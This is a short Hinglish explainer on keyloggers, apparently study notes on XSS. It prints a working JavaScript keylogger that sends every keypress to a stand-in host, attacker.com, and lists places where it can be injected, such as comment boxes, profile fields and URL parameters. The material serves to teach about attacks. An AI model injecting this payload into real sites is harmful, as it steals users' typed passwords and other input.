# What is keylogger 

🧠 Keylogger ek aisi script hoti hai jo user jo kuch bhi keyboard se likhta hai (jaise username, password), woh secretly record kar leti hai.

### 🕵️‍♂️ Penetration Testing ya Malicious XSS main attacker JS ka use karta hai jo har keypress ko record karta hai:

**document.addEventListener('keydown', function(e) {
  fetch('https://attacker.com/log?key=' + e.key);
});**

☠️ Ye code agar XSS ke through inject ho jaye, tou jab victim kuch type karega (login form waghera main), toh attacker ke server pe keys chali jayengi.

### 💻 Inject kahaan hota hai?
Jahan XSS possible ho:

Comment boxes

Profile name fields

URL parameters

Any place jahan user input reflect hoti hai